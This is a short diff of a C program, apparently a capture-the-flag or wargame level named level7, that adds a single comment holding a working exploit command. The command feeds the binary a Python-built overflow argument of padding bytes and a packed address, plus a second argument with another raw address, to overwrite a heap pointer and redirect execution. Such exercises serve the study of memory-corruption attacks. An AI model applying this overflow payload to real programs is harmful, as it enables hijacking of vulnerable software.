@@ -15,6 +15,7 @@ void m(void)
     printf("%s - %d\n", c, time(NULL));
 }
 
+// /home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
 int main(int argc, char **argv)
 {
     struct node *c1;
